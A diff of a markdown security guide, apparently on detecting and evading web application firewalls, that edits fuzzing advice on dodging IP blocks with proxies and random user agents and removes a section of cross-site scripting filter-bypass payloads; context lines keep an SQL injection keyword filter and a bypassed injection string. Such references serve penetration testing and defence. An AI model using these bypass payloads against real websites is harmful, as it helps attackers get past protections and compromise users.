@@ -1417,10 +1417,8 @@ Wanna detect WAFs? Lets see how.
     </tr>
 </table>
 
-# Evasion Techniques
+## Evasion Techniques
 Lets look at some methods of bypassing and evading WAFs.
-
-## Cross Site Scripting:
 
 ### Fuzzing/Bruteforcing:
 #### Method:  
@@ -1430,11 +1428,10 @@ Running a set of payloads against the URL/endpoint. Some nice fuzzing wordlists:
     - [Fuzz-DB/Attack](https://github.com/fuzzdb-project/fuzzdb/tree/master/attack)
 
 #### Technique:
-
-- Load up your wordlist into Burp Suite Intruder/custom fuzzer and start the bruteforce.
+- Load up your wordlist into fuzzer and start the bruteforce.
 - Record/log all responses from the different payloads fuzzed.
 - Use random user-agents, ranging from Chrome Desktop to iPhone browser.
-- If blocking noticed, increase fuzz latency (eg. 2-4 secs)
+- If blocking noticed, increase fuzz latency (eg. 2-4 secs).
 - Always use proxies, since chances are real that your IP gets blocked.
 
 #### Drawbacks:
@@ -1509,55 +1506,6 @@ __Keyword filer__: `and`, `or`, `union`, `where`, `limit`, `group by`, `select`,
 __Possible PHP Filter Code__:    `preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)`
 - __Filtered Injection__: `1 || lpad(user,7,1)`
 - __Bypassed Injection__: `1%0b||%0blpad(user,7,1)`
-
----
-
-__Scenario 2: Cross Site Scripting__
-
-- Normal deliberate test:  
-```
-<script>alert()</script>
-```
-- Checking if the firewall is blocking only lowercase:  
-```
-<sCRipT>alert(1)</sCRiPt>
-```
-- Bypassing firewall regex with new line (`\r\n`):
-```
-<script>\r\nalert(1)</script>
-
-<script>
-alert(1)</script>
-```
-- Bypass trial with hex notation:
-```
-%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3B%3C%2F%73%63%72%69%70%74%3E
-```
-- Bypass trials with ECMAScript6 variation:  
-```
-<svg><script>alert&DiacriticalGrave;1&DiacriticalGrave;</p>
-<svg><script>alert`1`   
-```
-- Testing for recursive filters:  
-```
-<scr<script>ipt>alert(1);</scr</script>ipt>
-```
-- Bypass trials with anchor tags without whitespaces:  
-```
-<a/href=”j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pt:alert&lpar;1&rpar;”>
-```
-- Bypass trial with HTML encoded notation:
-```
-&#x3C;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;&#x3B;&#x3C;&#x2F;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3E;
-```
-- Bypass trial with unicode encoding:
-```
-script/src="data&colon;text%2Fj\u0061v\u0061script,\u0061lert(1)"></script a=\u0061 & /=%2F
-```
-- Bypass trial via overflow technique:
-```
-<iframe src=j&NewLine;&Tab;a&NewLine;&Tab;&Tab;v&NewLine;&Tab;&Tab;&Tab;a&NewLine;&Tab;&Tab;&Tab;&Tab;s&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;c&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;i&NewLine;&Tab;&Tab; &Tab;&Tab;&Tab;&Tab;&Tab;&Tab;p&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&colon;a&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;l&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab; &Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;e&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;r&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;t&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab; &Tab;&Tab;&Tab;&Tab;&Tab;%28&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;1&NewLine;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;&Tab;%29></iframe> ​
-```
 
 ### Obfuscation:
 #### Method:
